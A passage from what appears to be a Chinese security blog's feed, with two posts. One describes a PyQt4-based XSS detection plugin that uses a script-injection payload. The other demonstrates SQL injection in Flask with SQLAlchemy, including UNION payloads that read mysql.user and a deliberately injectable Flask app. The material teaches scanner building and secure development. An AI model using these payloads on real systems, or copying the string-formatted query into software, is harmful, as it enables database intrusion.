class="function"><span class="keyword">def</span> <span class="title">_loadFinished</span><span class="params">(self, result)</span>:</span>  </span><br><span class="line">    self.frame = self.mainFrame()  </span><br><span class="line">    self.app.quit()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">3</span>]: url = <span class="string">'http://192.168.1.126:8080/html.html'</span></span><br><span class="line">In [<span class="number">4</span>]: r = Render(url)</span><br><span class="line">In [<span class="number">5</span>]: result = r.frame.toHtml()</span><br><span class="line">In [<span class="number">6</span>]: result</span><br><span class="line">Out[<span class="number">6</span>]: PyQt4.QtCore.QString(<span class="string">u'&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;\n    &lt;title&gt;111&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;script type="text/javascript"&gt;\n    document.body.appendChild(document.createTextNode(String.fromCharCode(84,48,48,76,83)));\n&lt;/script&gt;T00LS\n\n&lt;/body&gt;&lt;/html&gt;'</span>)</span><br></pre></td></tr></table></figure>
<p>可以发现和requests不同，Html内JavaScript已经执行并在html里面插入了<code>T00LS</code>这样的节点。这样我们就可以获取并匹配Js执行之后的内容<code>T00LS</code>，保证Xss测试用的Payload在浏览器是可以被执行的，减少误报。</p>
<p>修改后的xss检测插件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">from</span> PyQt4.QtGui <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> PyQt4.QtCore <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> PyQt4.QtWebKit <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Render</span><span class="params">(QWebPage)</span>:</span>  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span>  </span><br><span class="line">    self.app = QApplication(sys.argv)  </span><br><span class="line">    QWebPage.__init__(self)  </span><br><span class="line">    self.loadFinished.connect(self._loadFinished)  </span><br><span class="line">    self.mainFrame().load(QUrl(url))  </span><br><span class="line">    self.app.exec_()</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">_loadFinished</span><span class="params">(self, result)</span>:</span>  </span><br><span class="line">    self.frame = self.mainFrame()  </span><br><span class="line">    self.app.quit() </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss_detect</span><span class="params">(method=<span class="string">'GET'</span>, querylist=[], url=<span class="string">''</span>)</span>:</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    resp = <span class="keyword">None</span></span><br><span class="line">    payload = <span class="string">'--&gt;\'"&gt;&lt;script&gt;document.body.appendChild(document.createTextNode(String.fromCharCode(84,48,48,76,83)));&lt;/script&gt;'</span></span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">for</span> query <span class="keyword">in</span> querylist:</span><br><span class="line">            url = <span class="string">'&#123;url&#125;?&#123;query&#125;=&#123;payload&#125;'</span>.format(url=url,query=query,payload=payload)</span><br><span class="line">        r = Render(url)</span><br><span class="line">        result = r.frame.toHtml()</span><br><span class="line">        resp = str(result.toAscii())</span><br><span class="line">        <span class="keyword">print</span> resp</span><br><span class="line">    <span class="keyword">if</span> resp:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'T00LS'</span> <span class="keyword">in</span> resp:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> xss_detect(querylist=[<span class="string">'id'</span>,], url=<span class="string">'http://192.168.1.126/xss.php'</span>)</span><br></pre></td></tr></table></figure>
<p>分别对上面构造的两个php脚本进行检测，可以发现不会出现相同的误报了。</p>
<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5jw1f63x4gyaq8j30ub044gnp.jpg" alt=""></p>
<p>这种方法保证了我们所插入的Js代码确实在浏览器能执行，实际的环境中，我们应该让Js生成比<code>T00LS</code>更加复杂得多的字符，这样就可以避免误报了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直以来的一个想法，现在有新的思路的就写出来看看。&lt;/p&gt;
&lt;p&gt;自动化Web漏洞扫描器是渗透测试亘古不变的话题。把当前一直重复的手工劳动和新的思路转化为自动化工具，利用技术和程序实现为自己节省时间是一件非常有趣的事情。然而，自动化的路坑却不少。其中误报就是一件比较蛋疼的事情，XSS的误报尤其蛋疼。当前众多扫描器的XSS插件都存在误报的情况，我们来看一下大部分扫描器的XSS检测思路，我写了一个简单的Python函数来描述它，当然实际的通用XSS检测插件肯定会比这个要复杂的多,我只截取了一部分来说明思路：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;headers=&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;xss_detect&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(method=&lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;, querylist=[], url=&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    params = &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    resp = &lt;span class=&quot;keyword&quot;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 这里有更多的payload,如onfocus=alert(2333)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    payload = &lt;span class=&quot;string&quot;&gt;&#39;--&amp;gt;\&#39;&quot;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&#39;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; method == &lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; query &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; querylist:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;# url = &#39;&amp;#123;url&amp;#125;?&amp;#123;query&amp;#125;=&amp;#123;payload&amp;#125;&#39;.format(url=url,query=query,payload=payload)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            params[query] = payload&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        resp = requests.get(url, params=params, headers=headers)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 此处省略POST&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; resp:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;# 这里有更多的正则匹配规则&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; resp.content:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://blog.neargle.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>讨论PythonWeb开发中可能会遇到的安全问题之SQL注入</title>
    <link href="http://blog.neargle.com/2016/07/22/pythonweb-framework-dev-vulnerable/"/>
    <id>http://blog.neargle.com/2016/07/22/pythonweb-framework-dev-vulnerable/</id>
    <published>2016-07-22T13:39:07.000Z</published>
    <updated>2016-09-21T11:57:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>好久没写文章了，最近一直都是在看文章。<br>近期写了好几个PythonWeb项目，在实现需求的过程中，一直在思考PythonWeb开发过程中会遇到哪些常见的Web安全问题呢？这些问题又在什么情况下会被利用者GetShell呢？下面就分类来讨论这些问题：(这也是重新启用博客的第一篇文章，顺便投给90Sec也不知道能不能过QAQ。)</p>
<h1 id="常见漏洞分析">常见漏洞分析</h1><h2 id="SQLI">SQLI</h2><p>SQL注入所产生的条件是用户输入可构造sql语句并带入数据库执行。在Web应用中，容易产生SQL注入的输入一般是GET或POST请求参数。在PythonWeb开发中，以Flask框架为例，Flask里获取GET或POST请求数据的方式分别是<code>request.args.get(&#39;id&#39;, 0, type=int)</code>和<code>request.form.get(&#39;id&#39;, 0, type=int)</code>两种方式，另外Flask还支持在URL路由里带入变量：<code>@app.route(&#39;/news/&lt;int:id&gt;&#39;)</code>，当程序员定义了这样的URL，则id这个变量在该视图里就是可以调用的。两种方法获取都是可以限定参数的类型，前者如果程序指定type为int，当用户传入无法转换成整形的字符串时，就返回None（若指定了默认值则为默认值，例子的默认值为0），后者出现这种情况则直接返回404.</p>
<p>PythonWeb开发中，在处理数据库的过程中经常使用orm库进行数据库处理，orm库是防SQL注入的好手。Flask和Tornado经常使用Sqlalchemy，而Django有自己自带的orm引擎。举一个用Sqlalchemy建模型类，并使用模型类查询用户数据的例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> Column, Integer, String, DateTime</span><br><span class="line"></span><br><span class="line">engine = create_engine(<span class="string">'mysql+pymysql://user:password@192.168.1.101/test'</span>)</span><br><span class="line">DBSession = sessionmaker(bind=engine)</span><br><span class="line">session = DBSession()</span><br><span class="line">Base = declarative_base()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_t</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'user_t'</span></span><br><span class="line">    user_id = Column(Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    username = Column(String)</span><br><span class="line">    userpassword = Column(String)</span><br><span class="line">    createtime = Column(DateTime, default=datetime.utcnow)</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>正常的查询与数据展示:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="prompt">&gt;&gt;&gt; </span>user = session.query(user_t).filter(user_t.username==<span class="string">'test'</span>).first()</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>user.__dict__</span><br><span class="line">&#123;<span class="string">'username'</span>: <span class="string">'test'</span>, <span class="string">'userpassword'</span>: <span class="string">'098f6bcd4621d373cade4e832627b4f6'</span>, <span class="string">'_sa_instance_state'</span>: &lt;sqlalchemy.orm.state.InstanceState object at <span class="number">0x03F96530</span>&gt;, <span class="string">'user_id'</span>: <span class="number">3</span>, <span class="string">'createtime'</span>: datetime.datetime(<span class="number">2016</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">50</span>, <span class="number">16</span>)&#125;</span><br></pre></td></tr></table></figure>
<p>在数据库执行的sql语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> user_t.user_id <span class="keyword">AS</span> user_t_user_id, user_t.username <span class="keyword">AS</span> user_t_username, user_t.userpassword <span class="keyword">AS</span> user_t_userpassword, user_t.createtime <span class="keyword">AS</span> user_t_createtime </span><br><span class="line"><span class="keyword">FROM</span> user_t </span><br><span class="line"><span class="keyword">WHERE</span> user_t.username = <span class="string">'test'</span> </span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">1</span></span></span><br></pre></td></tr></table></figure>
<p>如果我们构造sql注入测试语句，并传入Sqlalchemy的查询语句中，看一下返回。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="prompt">&gt;&gt;&gt; </span>user = session.query(user_t).filter(user_t.username==<span class="string">"test'"</span>).first()</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span><span class="keyword">print</span> user</span><br><span class="line"><span class="keyword">None</span></span><br></pre></td></tr></table></figure>
<p>那么在数据库中执行的sql语句是什么呢？</p>
<p><img src="http://ww3.sinaimg.cn/large/005y7Ba5jw1f632h0ycipj311y02zmyh.jpg" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> user_t.user_id <span class="keyword">AS</span> user_t_user_id, user_t.username <span class="keyword">AS</span> user_t_username, user_t.userpassword <span class="keyword">AS</span> user_t_userpassword, user_t.createtime <span class="keyword">AS</span> user_t_createtime </span><br><span class="line"><span class="keyword">FROM</span> user_t </span><br><span class="line"><span class="keyword">WHERE</span> user_t.username = <span class="string">'test\''</span> </span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">1</span></span></span><br></pre></td></tr></table></figure>
<p>由此可见在当Sqlalchemy接收到字符串进行查询时，在构造SQL语句的时候，会默认使用单引号包裹字符串，如果字符串内含有单引号的话，会使用<code>\</code>进行转义。从而达到过滤单引号的效果。</p>
<p>我们知道原生的sql语句在进行字符串拼接的情况下，容易产生sql注入，那Sqlalchemy是否支持执行sql语句呢？答案是肯定的，下面是Sqlalchemy执行sql语句的一个例子。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">18</span>]: <span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> text</span><br><span class="line">In [<span class="number">19</span>]: sql = text(<span class="string">'SELECT * from user_t WHERE username = :username;'</span>)</span><br><span class="line">In [<span class="number">20</span>]: data = session.execute(sql, &#123;<span class="string">'username'</span>:<span class="string">'test'</span>&#125;).fetchall()</span><br><span class="line">In [<span class="number">21</span>]: data</span><br><span class="line">Out[<span class="number">21</span>]: [(<span class="number">3</span>, <span class="string">'test'</span>, <span class="string">'098f6bcd4621d373cade4e832627b4f6'</span>, datetime.datetime(<span class="number">2016</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">50</span>, <span class="number">16</span>))]</span><br></pre></td></tr></table></figure>
<p>那么这种情况下，会造成sql注入吗？同样我们传入<code>test&#39;</code>字符串，看看是否会进行对其进行过滤。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">22</span>]: data = session.execute(sql, &#123;<span class="string">'username'</span>:<span class="string">"test'"</span>&#125;).fetchall()</span><br></pre></td></tr></table></figure>
<p><img src="http://ww2.sinaimg.cn/large/005y7Ba5jw1f632dvfasjj30lv01y0t3.jpg" alt=""></p>
<p>在数据库执行的sql语句为<code>SELECT * from user_t WHERE username = &#39;test\&#39;&#39;</code>,可见Sqlalchemy对其进行了相同的处理。那么是不是使用Sqlalchemy的情况下就不用产生sql注入了呢？显然，如果正确使用Sqlchemy的话，出现sql注入的情况会大大的降低，但是愚蠢的sql语句处理方法，同样会导致sql注入。如果不使用execute传入参数，而是使用python格式化字符串或拼接字符串的话，出现sql注入的概率会大大增加。示例代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="prompt">&gt;&gt;&gt; </span>sqli_payload = <span class="string">"test'"</span></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>sql = text(<span class="string">"SELECT * from user_t WHERE username = '%s'"</span> %sqli_payload)</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>data = session.execute(sql).fetchall()</span><br><span class="line"></span><br><span class="line">ProgrammingError: (pymysql.err.ProgrammingError) (<span class="number">1064</span>, <span class="string">u"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''test''' at line 1"</span>) [SQL: <span class="string">u"SELECT * from user_t WHERE username = 'test''"</span>]</span><br></pre></td></tr></table></figure>
<p>报错，从错误信息上或查看数据库记录可见，单引号被成功带进了sql语句中。因此我们就可以构造payload获取数据。例如：<code>sqli_payload = &quot;test&#39; union select user(),1,2,3#&quot;</code>或<code>sqli_payload = &quot;test&#39; union SELECT host,user,1,2 FROM mysql.user LIMIT 1 OFFSET 1#&quot;</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">22</span>]: sqli_payload = <span class="string">"test' union select user(),1,2,3#"</span></span><br><span class="line">In [<span class="number">23</span>]: sql = text(<span class="string">"SELECT * from user_t WHERE username = '%s'"</span> %sqli_payload)</span><br><span class="line">In [<span class="number">24</span>]: data = session.execute(sql).fetchall()</span><br><span class="line">In [<span class="number">25</span>]: data</span><br><span class="line">Out[<span class="number">25</span>]:</span><br><span class="line">[(<span class="string">'3'</span>, <span class="string">'test'</span>, <span class="string">'098f6bcd4621d373cade4e832627b4f6'</span>, <span class="string">'2016-07-06 06:50:16'</span>),</span><br><span class="line"> (<span class="string">'root@localhost'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: sqli_payload = <span class="string">"test' union SELECT host,user,1,2 FROM mysql.user LIMIT 1 OFFSET 1#"</span></span><br><span class="line">In [<span class="number">34</span>]: sql = text(<span class="string">"SELECT * from user_t WHERE username = '%s'"</span> %sqli_payload)</span><br><span class="line">In [<span class="number">35</span>]: data = session.execute(sql).fetchall()</span><br><span class="line">In [<span class="number">36</span>]: data</span><br><span class="line">Out[<span class="number">36</span>]: [(<span class="string">'%'</span>, <span class="string">'root'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>)]</span><br></pre></td></tr></table></figure>
<p>结合上面提到的Flask传入参数的方法，我们可以整理在<code>Flask+Sqlalchemy</code>的情况下，比较容易产生sql注入的情况。</p>
<ol>
<li>获取get、post请求参数没有限定type或指定type为str</li>
<li>同样的，定义url参数没有限定参数类型或指定参数回调为str</li>
<li>使用用户可控的参数进行sql语句格式化或拼接并带入数据库执行的</li>
</ol>
<p>综合以上几点，我们写一个基于flask的单文件web小程序。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> Column, Integer, String, DateTime, text</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">engine = create_engine(<span class="string">'mysql+pymysql://root:root@127.0.0.1/test'</span>, echo=<span class="keyword">True</span>)</span><br><span class="line">DBSession = sessionmaker(bind=engine)</span><br><span class="line">session = DBSession()</span><br><span class="line">Base = declarative_base()</span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/id-&lt;id&gt;/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">(id)</span>:</span></span><br><span class="line">    template = <span class="string">'''</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;h1&gt;hello! &#123;&#123; username &#125;&#125;&lt;/h1&gt;</span><br><span class="line">        &lt;/div&gt;'''</span></span><br><span class="line">    sql = text(<span class="string">"SELECT * from user_t WHERE user_id = '%s'"</span> %id)</span><br><span class="line">    data = session.execute(sql).fetchall()</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, username=data[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5jw1f632fm8u2hj30ii079gm7.jpg" alt=""></p>
<p>注入测试：</p>
<p><img src="http://ww3.sinaimg.cn/large/005y7Ba5jw1f632ge9caij310507etaw.jpg" alt=""></p>
<h3 id="总结与思考">总结与思考</h3><ol>
<li>想要在FlaskWeb应用里面发现漏洞，不仅要注意get和post请求的参数，有可能出现问题的变量隐含在url中。</li>
<li>PythonWeb开发中，即使使用orm引擎，也有可能导致sql注入。</li>
<li>Sqlalchemy使用单引号包裹传进来的字符串变量，并使用<code>\</code>过滤字符串中的单引号。那么宽字符注入在使用本文的环境中是否可行呢？答案是否定的，Flask默认会将所有传入的字符串转为unicode，但不排除使用别的PythonWeb框架结合Sqlalchemy会产生宽字符注入的情况。</li>
</ol>
<h3 id="最后再说点啥">最后再说点啥</h3><p>Web应用包含sql注入的情况，通常的想法会使用sql注入写文件拿webshell。但是写webshell的情况，在多数的PythonWeb框架或PythonWeb生产环境中并不管用。当然这并不代表，sql注入的危害性在PythonWeb环境中会降低，你依旧可以使用它来进行很多危险的行为。PythonWeb框架会产生的安全问题也有很多有趣的地方值得我们思考，我会继续分析其他的诸如XSS，SSRF等漏洞在PythonWeb上面所表现的特点，也会分析诸如Pickle反序列化，Flask强大的Debug模式等Python特性可能产生的安全问题。</p>
<p>总之路还很长，还得继续加油啊…</p>
<h2 id="下一章XSS…">下一章XSS…</h2>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;&lt;p&gt;好久没写文章了，最近一直都是在看文章。&lt;br&gt;近期写了好几个PythonWeb项目，在实现需求的过程中，一直在思考PythonWeb开发过程中会遇到哪些常见的Web安全问题呢？这些问题又在什么情况下会被利用者GetShell呢？下面就分类来讨论这些问题：(这也是重新启用博客的第一篇文章，顺便投给90Sec也不知道能不能过QAQ。)&lt;/p&gt;
&lt;h1 id=&quot;常见漏洞分析&quot;&gt;常见漏洞分析&lt;/h1&gt;&lt;h2 id=&quot;SQLI&quot;&gt;SQLI&lt;/h2&gt;&lt;p&gt;SQL注入所产生的条件是用户输入可构造sql语句并带入数据库执行。在Web应用中，容易产生SQL注入的输入一般是GET或POST请求参数。在PythonWeb开发中，以Flask框架为例，Flask里获取GET或POST请求数据的方式分别是&lt;code&gt;request.args.get(&amp;#39;id&amp;#39;, 0, type=int)&lt;/code&gt;和&lt;code&gt;request.form.get(&amp;#39;id&amp;#39;, 0, type=int)&lt;/code&gt;两种方式，另外Flask还支持在URL路由里带入变量：&lt;code&gt;@app.route(&amp;#39;/news/&amp;lt;int:id&amp;gt;&amp;#39;)&lt;/code&gt;，当程序员定义了这样的URL，则id这个变量在该视图里就是可以调用的。两种方法获取都是可以限定参数的类型，前者如果程序指定type为int，当用户传入无法转换成整形的字符串时，就返回None（若指定了默认值则为默认值，例子的默认值为0），后者出现这种情况则直接返回404.&lt;/p&gt;
